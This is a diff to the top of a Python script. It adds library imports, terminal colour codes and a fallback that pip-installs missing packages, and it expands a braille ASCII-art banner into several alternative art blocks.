@@ -1,7 +1,20 @@
+import inspect
 import os, sys
 from time import sleep
-import subprocess
+import subprocess,random
 import hashlib
+R = ('\033[31m')
+W = ("\033[97m")
+G = ('\033[92m')
+BLUE = ("\033[34m")
+LIGHTGREEN_EX = ('\033[92m')
+try:
+    import pyfiglet,webbrowser,requests
+    from termcolor import colored
+except ModuleNotFoundError:
+	os.system("pip install pyfiglet termcolor webbrowser requests")
+	import pyfiglet,webbrowser,requests
+	from termcolor import colored
 asci =('''
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀
@@ -27,10 +40,148 @@ asci =('''
 ⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡿⠛⣠⣟⣁⠤⠖⠋⠁⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀
 ⠀⠀⠀⠀⠀⠀⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡟⢸⠿⠃⠀
 ⠀⠀⠀⠀⠀⠀⢸⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢦⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣆⠀⠀⠀⠀⠀⠀''')
+⠀⠀⠀⠀⠀⠀⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣆⠀⠀⠀⠀⠀⠀''','''⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢲⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠄⠂⢉⠤⠐⠋⠈⠡⡈⠉⠐⠠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢀⡀⢠⣤⠔⠁⢀⠀⠀⠀⠀⠀⠀⠀⠈⢢⠀⠀⠈⠱⡤⣤⠄⣀⠀⠀⠀⠀⠀
+⠀⠀⠰⠁⠀⣰⣿⠃⠀⢠⠃⢸⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠈⢞⣦⡀⠈⡇⠀⠀⠀
+⠀⠀⠀⢇⣠⡿⠁⠀⢀⡃⠀⣈⠀⠀⠀⠀⢰⡀⠀⠀⠀⠀⢢⠰⠀⠀⢺⣧⢰⠀⠀⠀⠀
+⠀⠀⠀⠈⣿⠁⡘⠀⡌⡇⠀⡿⠸⠀⠀⠀⠈⡕⡄⠀⠐⡀⠈⠀⢃⠀⠀⠾⠇⠀⠀⠀⠀
+⠀⠀⠀⠀⠇⡇⠃⢠⠀⠶⡀⡇⢃⠡⡀⠀⠀⠡⠈⢂⡀⢁⠀⡁⠸⠀⡆⠘⡀⠀⠀⠀⠀
+⠀⠀⠀⠸⠀⢸⠀⠘⡜⠀⣑⢴⣀⠑⠯⡂⠄⣀⣣⢀⣈⢺⡜⢣⠀⡆⡇⠀⢣⠀⠀⠀⠀
+⠀⠀⠀⠇⠀⢸⠀⡗⣰⡿⡻⠿⡳⡅⠀⠀⠀⠀⠈⡵⠿⠿⡻⣷⡡⡇⡇⠀⢸⣇⠀⠀⠀
+⠀⠀⢰⠀⠀⡆⡄⣧⡏⠸⢠⢲⢸⠁⠀⠀⠀⠀⠐⢙⢰⠂⢡⠘⣇⡇⠃⠀⠀⢹⡄⠀⠀
+⠀⠀⠟⠀⠀⢰⢁⡇⠇⠰⣀⢁⡜⠀⠀⠀⠀⠀⠀⠘⣀⣁⠌⠀⠃⠰⠀⠀⠀⠈⠰⠀⠀
+⠀⡘⠀⠀⠀⠀⢊⣤⠀⠀⠤⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⠄⠀⢸⠃⠀⠀⠀⠀⠀⠃⠀
+⢠⠁⢀⠀⠀⠀⠈⢿⡀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⢀⠏⠀⠀⠀⠀⠀⠀⠸⠀
+⠘⠸⠘⡀⠀⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠁⠀⠃⠀⠀⠀⠀⢀⠎⠀⠀⠀⠀⠀⢠⠀⠀⡇
+⠀⠇⢆⢃⠀⠀⠀⠀⠀⡏⢲⢤⢀⡀⠀⠀⠀⠀⠀⢀⣠⠄⡚⠀⠀⠀⠀⠀⠀⣾⠀⠀⠀
+⢰⠈⢌⢎⢆⠀⠀⠀⠀⠁⣌⠆⡰⡁⠉⠉⠀⠉⠁⡱⡘⡼⠇⠀⠀⠀⠀⢀⢬⠃⢠⠀⡆
+⠀⢢⠀⠑⢵⣧⡀⠀⠀⡿⠳⠂⠉⠀⠀⠀⠀⠀⠀⠀⠁⢺⡀⠀⠀⢀⢠⣮⠃⢀⠆⡰⠀
+⠀⠀⠑⠄⣀⠙⡭⠢⢀⡀⠀⠁⠄⣀⣀⠀⢀⣀⣀⣀⡠⠂⢃⡀⠔⠱⡞⢁⠄⣁⠔⠁⠀
+⠀⠀⠀⠀⠀⢠⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠉⠁
+⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀''','''⠤⠤⠤⠤⠤⠤⢤⣄⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⠤⠶⠶⠶⠦⠤⠤⠤⠤⠤⢤⣤⣀⣀⣀⣀⣀⣀⠀
+⠀⠀⠀⠀⢀⠄⢂⣠⣭⣭⣕⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⠀⠀⠀⠤⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉
+⠀⠀⢀⠜⣳⣾⡿⠛⣿⣿⣿⣦⡠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣤⣤⣤⣤⣤⣤⣤⣤⣤⣍⣀⣦⠦⠄⣀⠀⡀
+⠀⠠⣄⣽⣿⠋⠀⡰⢿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡿⠛⠛⡿⠿⣿⣿⣿⣿⣿⣿⣷⣶⣿⣁⣂⣤⡄
+⢳⣶⣼⣿⠃⠀⢀⠧⠤⢜⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠁⠀⠀⠀⡇⠀⣀⡈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠁⠐⠀⣀
+⠀⠙⠻⣿⠀⠀⠀⠀⠀⠀⢹⣿⣿⡝⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡿⠋⠀⠀⠀⠀⠠⠃⠁⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⡿⠋⠀
+⠀⠀⠀⠙⡄⠀⠀⠀⠀⠀⢸⣿⣿⡃⢼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⡏⠉⠉⠻⣿⡿⠋
+⠀⠀⠀⠀⢰⠀⠀⠰⡒⠊⠻⠿⠋⠐⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⠀⠀⠀⠀⣿⠇
+⠀⠀⠀⠀⠸⣇⡀⠀⠑⢄⠀⠀⠀⡠⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢖⠠⠤⠤⠔⠙⠻⠿⠋⠱⡑⢄⠀⢠⠟
+⠀⠀⠀⠀⠀⠀⠈⠉⠒⠒⠻⠶⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⠀⠀⠀⠀⠡⢀⡵⠃
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠦⣀⠀⠀⠀⠀⠀⢀⣤⡟⠉
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠙⠛⠓⠒⠲⠿⢍⡀''','''⠀⠀⠀⠀⢀⡠⠤⠔⢲⢶⡖⠒⠤⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⣠⡚⠁⢀⠀⠀⢄⢻⣿⠀⠀⠀⡙⣷⢤⡀⠀⠀⠀⠀⠀⠀
+⠀⡜⢱⣇⠀⣧⢣⡀⠀⡀⢻⡇⠀⡄⢰⣿⣷⡌⣢⡀⠀⠀⠀⠀
+⠸⡇⡎⡿⣆⠹⣷⡹⣄⠙⣽⣿⢸⣧⣼⣿⣿⣿⣶⣼⣆⠀⠀⠀
+⣷⡇⣷⡇⢹⢳⡽⣿⡽⣷⡜⣿⣾⢸⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀
+⣿⡇⡿⣿⠀⠣⠹⣾⣿⣮⠿⣞⣿⢸⣿⣛⢿⣿⡟⠯⠉⠙⠛⠓
+⣿⣇⣷⠙⡇⠀⠁⠀⠉⣽⣷⣾⢿⢸⣿⠀⢸⣿⢿⠀⠀⠀⠀⠀
+⡟⢿⣿⣷⣾⣆⠀⠀⠘⠘⠿⠛⢸⣼⣿⢖⣼⣿⠘⡆⠀⠀⠀⠀
+⠃⢸⣿⣿⡘⠋⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⡆⠇⠀⠀⠀⠀
+⠀⢸⡿⣿⣇⠀⠈⠀⠤⠀⠀⢀⣿⣿⣿⣿⣿⣿⣧⢸⠀⠀⠀⠀
+⠀⠈⡇⣿⣿⣷⣤⣀⠀⣀⠔⠋⣿⣿⣿⣿⣿⡟⣿⡞⡄⠀⠀⠀
+⠀⠀⢿⢸⣿⣿⣿⣿⣿⡇⠀⢠⣿⡏⢿⣿⣿⡇⢸⣇⠇⠀⠀⠀
+⠀⠀⢸⡏⣿⣿⣿⠟⠋⣀⠠⣾⣿⠡⠀⢉⢟⠷⢼⣿⣿⠀⠀⠀
+⠀⠀⠈⣷⡏⡱⠁⠀⠊⠀⠀⣿⣏⣀⡠⢣⠃⠀⠀⢹⣿⡄⠀⠀
+⠀⠀⠘⢼⣿⠀⢠⣤⣀⠉⣹⡿⠀⠁⠀⡸⠀⠀⠀⠈⣿⡇''','''⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢀⢠⣤⣤⣤⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⣶⡏⠀⠀⠈⠉⠙⣶⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣼⢶⡶⣦⣤⡀⠀⣠⣤⠶⠎⠉⠉⠀⠀⢮⣷⡆⠀⠀⠀
+⠀⠀⠀⢀⣼⢻⠀⠀⠀⠀⠀⠀⠀⠀⠻⠦⠤⠶⠛⠛⠛⠛⢻⣿⡻⣜⢧⡻⣝⡞⣿⡟⠃⠀⠀⠀⠀⠀⠀⠀⢠⢂⡿⣀⠀⠀
+⠀⠀⠀⢸⣇⢺⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣸⣿⢳⡝⣮⣳⣝⡾⡼⣭⣻⣇⢀⠀⠀⠀⠀⠀⠀⠰⡨⠔⣿⠀⠀
+⠀⠀⠀⢸⡧⣹⠀⠀⠀⠀⠀⠀⢀⡠⠔⠈⠉⠀⠀⠀⠀⣿⢮⡳⣝⣶⣟⡻⣿⣷⡟⣟⡻⣟⣧⡄⠀⢠⣤⣤⣤⣷⡜⣿⠀⠀
+⠀⠀⠀⠘⢳⣬⠇⠀⢀⠠⠖⠚⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣳⡝⣞⠾⣿⣽⣷⢫⡞⣵⢻⡼⣽⣿⣿⣿⡹⣎⢷⣫⢟⣦⠀⠀
+⠀⠀⠀⢠⡿⠈⢀⡔⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠩⣷⣽⣮⣿⢷⣿⣯⣷⡹⣎⣷⣿⣯⡿⣏⢿⣷⡹⣎⢷⢫⣿⠀⠀
+⠀⠀⠀⡇⠀⠴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⠾⠿⠏⠁⠘⠿⠿⠿⠾⣿⣿⢿⣾⢳⡝⣮⢏⣷⣿⠀⠀
+⠀⠀⣿⡃⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣯⣷⣮⢳⡝⣮⣿⡟⢼⡇⠀
+⠀⠀⣿⡇⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⣷⣿⣷⣿⡓⠋⢳⣸⡇⠀
+⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣳⡇⠀
+⣀⣀⣿⣀⣀⣀⣀⡀⠀⠀⠀⣀⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡀⠀⠀⠀⢐⣀⣀⣀⣀⣷⣇⣀
+⠉⠉⣿⡍⠉⠉⡍⠁⠀⠀⠀⣿⣿⣿⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠈⡉⠍⠉⠉⣿⠉⠉
+⠀⠀⣀⣇⡴⠶⠆⠀⠀⠀⢀⠀⠛⠃⠀⠀⠀⠀⠀⠀⠀⣶⢿⡟⣦⠀⠀⠀⠀⠀⠀⠀⠘⠛⠀⡀⠀⠀⠀⢶⠶⢆⣿⣀⠀⠀
+⠘⠛⠋⢹⣇⠀⣀⣤⣤⠀⡀⠀⠀⠈⠀⢀⣀⣀⡀⠀⠀⠉⠛⠚⠉⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⢈⠆⣤⣄⣀⠀⣸⡏⠉⠛⠃
+⠀⠀⠀⢠⡾⠷⣏⠁⠀⠀⠈⠁⠀⢡⡶⠾⠉⠉⠹⢶⡀⠀⠀⠀⠀⠀⢠⡶⠉⠉⠹⠶⢦⡀⠈⠁⠀⡀⠎⣍⠶⢧⡀⠀⠀⠀
+⠀⠀⠈⠋⠁⠀⠘⠳⣀⣀⠀⠀⣸⠏⠁⠀⠀⠀⠀⢈⣿⠀⠀⠀⠀⢸⡏⠁⠀⠀⠀⠀⠈⠿⡀⠀⣀⡠⠞⠋⠀⠈⠛⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⣤⠟⠀⠀⠀⠀⠀⣠⣾⡟⠀⠀⠀⠀⠘⢯⡇⡄⠀⠀⠀⠀⠀⢿⡖⠏⠁⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣄⠀⠀⠀⠀⣟⣿⠉⢉⣉⣉⣉⣉⡉⠉⢻⡞⡄⠀⠀⠀⠀⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⣌⠦⡠⠤⣴⣾⢛⠄⠚⠀⠀⠀⠀⠘⠒⢾⠫⣷⡀⠤⠤⢼⣹⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢻⠿⠻⠏⢡⠚⠀⠀⠀⠀⠀⠀⠀⠀⠀⢣⠉⠻⠟⠿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠰⣿⠻⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⢸⣿⠀⠉⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠸⠀⠀⠀⠀⠀⠀⠀⠀⡠⠃⠀⠀⠀⢸⣿⣐⣦⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠄⠀⠀⠀⠀⠀⠙⠀⣀⠀⢀⡘⠉⠀⠀⠀⠀⠀⢰⣿⠞⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⢰⠂⣿⢂⡆⠀⠀⠀⠀⠀⠀⠸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⠀⠀⠀⠀⠀⠀⠈⣜⣿⡂⠆⠀⠀⠀⠀⠀⠀⣾⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠦⠶⠶⠴⠶⠾⠛⠃⠛⠻⠴⠶⠶⠶⠴⠞⠃''','''
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡤⠶⠒⠒⠒⠒⠒⠒⠶⠦⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣄⠀⠀⢀⣴⠞⠋⠉⢀⣀⣤⡤⠤⠤⠤⠤⢤⣤⣀⡀⠈⠙⠳⢦⣄⢀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢻⣀⡴⠋⢀⣤⠶⢚⣩⣥⠴⠖⠒⠒⠒⠲⠶⢦⣌⣙⠳⢦⣀⠀⢈⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣤⠞⣫⡴⠞⠋⠁⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠉⠻⢦⡉⢳⣿⣿⡏⠻⣆⠀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⣿⣿⣯⡾⠋⠀⠀⢀⡟⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⣄⠀⠀⠹⣦⣿⣿⣄⠀⠈⢷⡙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡟⣰⣿⣿⣿⡄⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⣿⡄⠀⠀⠀⢹⡄⠀⢹⣿⣿⣛⣻⣆⠀⠈⢷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⢠⣟⣿⣵⢗⡇⣸⠀⠀⣿⣧⠀⠀⠀⠀⠀⣿⣧⢠⠀⠀⠸⣷⠀⠀⣿⠙⠋⠻⣿⡄⠀⠈⣧⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠀⣾⡿⠁⠀⢸⡇⣿⠀⢰⡇⣿⠸⡆⠀⠰⠀⡇⢿⣼⡇⠀⢀⣿⡇⠀⢸⡄⠀⠀⠹⣷⠀⠀⢹⡯⠥⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠃⢰⣿⠁⠀⡀⢸⣧⣿⡄⢺⡇⢻⡀⣧⠀⠀⢀⡇⠸⣿⡇⠀⢸⣧⣷⢷⢸⡇⠀⢀⠈⠹⠇⠀⠀⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠀⣼⡗⠀⠀⠀⢸⣿⣿⡇⢸⣿⡾⣧⣿⡄⠀⢸⡇⠀⣿⡇⠀⣼⣿⣿⣾⢸⣿⣄⢸⡇⠀⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⡄⠛⠀⠀⠀⢀⣿⣿⠉⣧⢸⠛⠃⢻⣿⣷⢶⣾⠇⠀⣿⣧⠀⣾⠁⢸⣿⣸⠹⣏⢸⡇⠀⠀⠀⠀⠀⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⣼⠐⣿⠀⠀⣿⠀⢸⡏⣿⣀⣉⣛⠀⠀⠀⠉⠉⠀⠀⠀⠀⠀⠉⢨⣷⣶⣾⣿⡟⠀⢹⡼⡇⠀⠀⢸⡇⠀⣼⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⣿⠀⠀⣿⠀⣾⠟⣛⣭⣭⣭⣿⣤⠀⠀⠀⠀⠀⠀⠀⠀⠰⣾⡿⠿⠻⠿⣿⣶⣤⣿⣧⠀⠀⢸⡇⠀⠈⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⡿⠟⣿⠀⠀⢻⢰⣧⣾⡿⠟⠛⠉⠉⠁⠀⠀⠀⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⠀⠂⢸⠇⢀⡀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⣿⠀⠀⢸⣿⠿⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⢸⢷⡌⠀⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢸⣧⢦⣿⠀⠀⣸⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⢸⠛⣿⠀⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⠀⠀⢹⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⢸⠀⣿⠃⣽⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⡿⢸⣼⣿⡀⠀⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢀⠀⣾⣴⠇⠀⢸⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢠⡇⠈⠁⢻⡇⠂⠸⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢤⣀⠀⠀⠀⣀⣤⠶⠛⠀⠀⠀⠀⠀⠀⠀⠀⣼⡾⠃⢿⠃⠀⠀⠸⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢸⣇⡀⠀⠈⣧⠀⠑⣇⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠁⠘⢸⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⣻⠀⠀⣿⣿⢷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣷⣽⠀⠀⣾⠀⠀⠀⠀⣿⢻⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢸⡇⢀⠀⠀⢹⡆⠀⣿⢹⣶⡿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⢿⣿⢿⡄⠠⣿⠀⠀⠀⠀⢹⣾⣷
+⠀⠀    ⢻⡇⣸⠀⠂⠘⡇⠀⢿⠼⢛⣿⣄⣙⢷⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠛⡑⣿⣡⣼⣏⢸⡇⠀⣿⠀⠀⠀⠀⢸⡏⣯⠀⠀⠀⠀⠀⠀⠀
